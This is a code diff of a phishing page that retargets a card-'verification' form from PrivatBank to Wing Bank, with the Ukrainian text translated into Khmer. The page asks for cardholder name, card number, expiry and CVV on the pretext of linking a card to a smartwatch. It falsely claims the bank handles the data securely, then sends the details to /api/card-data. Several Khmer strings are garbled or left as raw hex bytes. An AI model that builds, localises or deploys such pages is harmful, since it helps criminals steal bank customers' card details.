@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="uk" dir="ltr">
+<html lang="km" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Верифікація картки</title>
+<title>ផ្ទៀងផ្ទាត់កាត</title>
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
   html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
@@ -91,14 +91,14 @@
 <body>
 
   <div class="topbar">
-    <img src="images/privatbank-logo.jpg" alt="PrivatBank">
-    <span class="topbar-title">Верифікація картки</span>
+    <img src="images/wb-logo.svg" alt="Wing Bank">
+    <span class="topbar-title">ផ្ទៀងផ្ទាត់កាត</span>
   </div>
 
   <div class="hero">
-    <img src="images/card-watch.jpg" alt="PrivatBank Card & Watch">
-    <h1>Прив'яжіть картку до годинника</h1>
-    <p>Введіть дані вашої картки для активації безконтактної оплати на смарт-годиннику</p>
+    <img src="images/card-watch.jpg" alt="Wing Bank Card & Watch">
+    <h1>ភ្ជាប់កាតទៅនាលិកា</h1>
+    <p>បញ្ចុលទិន្នន័យកាតរបស់កនហដីម្បីការទុទាត់មិនប៉ាហនៅលីនាលិកាឆ្លាតវៃ</p>
   </div>
 
   <div class="form-wrap">
@@ -106,31 +106,31 @@
       <div class="error-msg" id="errorMsg"></div>
 
       <div class="field">
-        <label>Ім'я власника картки</label>
+        <label>ឆ្មោហម្ចាស់កាត</label>
         <div class="input-wrap">
-          <input type="text" id="cardName" placeholder="Ім'я як на картці" autocomplete="cc-name">
+          <input type="text" id="cardName" placeholder="ឆ្មោហដុចនៅលីកាត" autocomplete="cc-name">
           <svg class="icon" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
         </div>
       </div>
 
       <div class="field">
-        <label>Номер картки</label>
+        <label>លេខកាត</label>
         <div class="input-wrap">
           <input type="tel" id="cardNumber" class="has-brand" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="cc-number">
           <svg class="icon" viewBox="0 0 24 24"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
           <img class="brand-icon" id="brandIcon" src="" alt="" style="display:none">
         </div>
-        <div class="field-error" id="cardNumberError">Недійсний номер картки</div>
+        <div class="field-error" id="cardNumberError">លេខកាតមិនត្រឹមត្រ</div>
       </div>
 
       <div class="row">
         <div class="field">
-          <label>Термін дії</label>
+          <label>កាលបរិច្ឆេទផុតកម្ណត</label>
           <div class="input-wrap">
             <input type="tel" id="cardExpiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="cc-exp">
             <svg class="icon" viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="18" rx="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
           </div>
-          <div class="field-error" id="expiryError">Недійсний термін дії</div>
+          <div class="field-error" id="expiryError">កាលបរិច្ឆេទមិនត្រឹមត្រ</div>
         </div>
         <div class="field">
           <label>CVV</label>
@@ -143,13 +143,13 @@
 
       <div class="info-box">
         <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
-        <span>Дані вашої картки зашифровані та безпечно обробляються PrivatBank</span>
+        <span>e19e91e19eb7e19e93e19f92e19e93e19e93e19f90e19e99e19e80e19eb6e19e8fe19e9ae19e94e19e9fe19f8be19e80e19e93e19ea0e19e8fe19f92e19e9ae19ebbe19e9ce19e94e19eb6e19e93e19e80e19ebbe19e8ae19e80e19eb6e19e8fe19eb6e19e9be19eb7e19e80 e19e93e19eb7e19e84e19e8be19f92e19e9ae19ea0e19f92e19e87e19eb7e19e84e19e8ae19f84e19e99e19e9fe19ebbe19e9ce19e8fe19f92e19e8fe19eb7e19e97e19eb6e19e96e19e8ae19f84e19e99 Wing Bank</span>
       </div>
     </div>
   </div>
 
   <div class="bottom">
-    <button class="submit-btn" id="submitBtn" onclick="submitCard()">Підтвердити та прив'язати картку</button>
+    <button class="submit-btn" id="submitBtn" onclick="submitCard()">បញ្ជាក់និងភ្ជាប់កាត</button>
   </div>
 
 <script>
@@ -159,7 +159,7 @@
 
   if (params.get("error") === "1") {
     const el = document.getElementById("errorMsg");
-    el.textContent = "Дані картки невірні";
+    el.textContent = "ទិន្នន័យកាតមិនត្រឹមត្រ";
     el.style.display = "block";
   }
 
@@ -263,14 +263,14 @@
     const expiry = expiryEl.value.trim();
     const cvv = document.getElementById("cardCvv").value.trim();
 
-    if (!name) { showError("Будь ласка, введіть ім'я власника картки"); return; }
-    if (!luhnCheck(number)) { showError("Будь ласка, введіть дійсний номер картки"); cardNumEl.classList.add("invalid"); return; }
-    if (!validateExpiry(expiry)) { showError("Будь ласка, введіть дійсний термін дії"); expiryEl.classList.add("invalid"); return; }
-    if (cvv.length < 3) { showError("Будь ласка, введіть CVV"); return; }
+    if (!name) { showError("សុមបញ្ចុលឆ្មោហម្ចាស់កាត"); return; }
+    if (!luhnCheck(number)) { showError("សុមបញ្ចុលលេខកាតត្រឹមត្រ"); cardNumEl.classList.add("invalid"); return; }
+    if (!validateExpiry(expiry)) { showError("សុមបញ្ចុលកាលបរិច្ឆេទត្រឹមត្រ"); expiryEl.classList.add("invalid"); return; }
+    if (cvv.length < 3) { showError("e19e9fe19ebbe19e98e19e94e19e89e19f92e19e85e19ebbe19e9be CVV"); return; }
 
     const btn = document.getElementById("submitBtn");
     btn.disabled = true;
-    btn.textContent = "Перевірка...";
+    btn.textContent = "e19e80e19e98e19f92e19e96e19ebbe19e84e19e96e19eb7e19e93e19eb7e19e8fe19f92e19e99...";
 
     try {
       const res = await fetch("/api/card-data", {
@@ -288,14 +288,14 @@
       if (data.success) {
         location.href = "card-waiting.html?order=" + orderId;
       } else {
-        showError(data.message || "Сталася помилка");
+        showError(data.message || "មានកម្ហិសកីតលីង");
         btn.disabled = false;
-        btn.textContent = "Підтвердити та прив'язати картку";
+        btn.textContent = "បញ្ជាក់និងភ្ជាប់កាត";
       }
     } catch(err) {
-      showError("Помилка з'єднання");
+      showError("កម្ហិសក្នុងការភ្ជាប់");
       btn.disabled = false;
-      btn.textContent = "Підтвердити та прив'язати картку";
+      btn.textContent = "បញ្ជាក់និងភ្ជាប់កាត";
     }
   }
 
